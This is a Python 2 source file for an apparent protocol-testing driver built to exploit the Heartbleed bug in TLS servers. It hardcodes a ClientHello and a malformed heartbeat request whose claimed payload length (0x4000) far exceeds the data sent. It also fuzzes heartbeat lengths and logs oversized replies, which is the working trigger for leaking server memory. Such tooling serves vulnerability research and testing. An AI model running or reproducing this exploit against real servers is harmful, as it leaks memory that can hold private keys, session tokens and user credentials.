#!/usr/bin/env python2.7
__author__ = 'wallsr'

import random
import struct

from collections import deque

from ape.protocol.explore import ExploreProtocol
from ape.protocol.driver import TesterDriver

from twisted.python import log


def _hex_to_bytes(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')


_description = 'A simple exploration driver for exploiting the Heartbleed bug'

_hello = _hex_to_bytes('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

# 18: tls record is heartbeat, 03 02: TLS Version 1.2, 00 03: Length
# 01: Heartbeat Request, 40 00: payload length
_heartbeat = _hex_to_bytes('''
18
03 02
00 03
01
40 00
''')


class TesterProtocol(ExploreProtocol):
    msg_handshake = '\x16'
    msg_heartbeat = '\x18'
    msg_alert = '\x15'

    def send_hello(self):
        global _hello
        self.transport.write(_hello)

    def send_heartbeat_fuzzed(self):
        #Adding the trailing underscore so that we will
        #separate the event properties with two __ in the log
        event = '-heartbeat_fuzzed_'

        #No need to fuzz these
        record_type = '\x18'
        tls_version = '\x03\x02'

        #Enum that only takes two types. Can fuzz with 3 values: 1,2, and other
        #We'll forgo that for now
        heartbeat_type = '\x01'

        #Content doesn't really matter, only the length
        hb_payload = 'a' * random.randint(0, 0x5000)
        event += '_payload' + str(len(hb_payload))

        hb_padding = 'A' * random.randint(0, 0xFF)
        event += '_padding' + str(len(hb_padding))

        #The higher the second number, the more likely actual is picked
        payload_switch = random.randint(0, 3)

        #Fuzz values: less than, more than, and actual
        #Make less
        if payload_switch == 0:
            length = random.randint(0, len(hb_payload)-1)
            hb_payload_length = struct.pack('!H', length)
            event += '_payloadlenless%d' % length
        #Make more
        elif payload_switch == 1:
            length = random.randint(len(hb_payload)+1, 0xFFFF)
            hb_payload_length = struct.pack('!H', length)
            event += '_payloadlenmore%d' % length
        #make actual
        else:
            hb_payload_length = struct.pack('!H', len(hb_payload))

        #The higher the second number, the more likely actual is picked
        record_len_switch = random.randint(0, 3)
        #TODO: I am not sure if we include the padding in the length
        actual_length = min(1+2+len(hb_payload)+len(hb_padding), 0xFFFF)

        #Fuzz values: less than, more than, and actual
        #Make less
        if record_len_switch == 0:
            length = random.randint(0, actual_length-1)
            record_length = struct.pack('!H', length)
            event += '_recordlenless%d' % length
        #Make more
        elif record_len_switch == 1:
            length = random.randint(actual_length+1, 0xFFFF)
            record_length = struct.pack('!H', length)
            event += '_recordlenmore%d' % length
        #make actual
        else:
            record_length = struct.pack('!H', actual_length)

        message_sanspayload = record_type + tls_version + record_length \
                  + heartbeat_type + hb_payload_length
        message = message_sanspayload + hb_payload + hb_padding

        log.msg(event)
        log.msg('Info: Heartbeat Message %s' % ":".join("{:02x}".format(ord(c)) for c in message_sanspayload))

        self.transport.write(message)

    def _send_heartbeat_request_heartbleed(self):
        global _heartbeat
        self.transport.write(_heartbeat)

    def get_message_type(self, message):
        #Use this method to determine message type
        mtype, payload = message

        if mtype == 22 and ord(payload[0]) == 0x0E:
            return 'handshake_done'
        elif mtype == 22:
            return 'handshake'
        elif mtype == 21:
            level, type = struct.unpack('>BB', payload)
            return 'alert__level%d_type%d' % (level, type)
        elif mtype == 20:
            return 'change_cipher'
        elif mtype == 23:
            return 'application_data'
        #elif mtype == 24 and len(payload) > 3:
        #    return 'heartbeat_vulnerable'
        elif mtype == 24:
            log.msg('Info: Received Heartbeat Message %s' % ":".join("{:02x}".format(ord(c)) for c in payload[:3]))
            log.msg('Info: ...Record size: %d' % len(payload))

            if len(payload) <= 3:
                return 'heartbeat_nopayload'

            hb_type, payload_length = struct.unpack('!BH', payload[:3])
            return 'heartbeat__record%d_payloadlen%d' % (len(payload), payload_length)

        return str(int(mtype))

    def handle_data(self):
        while True:
            mtype, version, length = struct.unpack('>BHH', (yield 5))
            payload = (yield length)
            received_event = self.get_message_type((mtype, payload))
            self.handle_received_event(received_event)


def main():
    driver = TesterDriver(TesterProtocol)
    driver.run()


if __name__ == '__main__':
    main()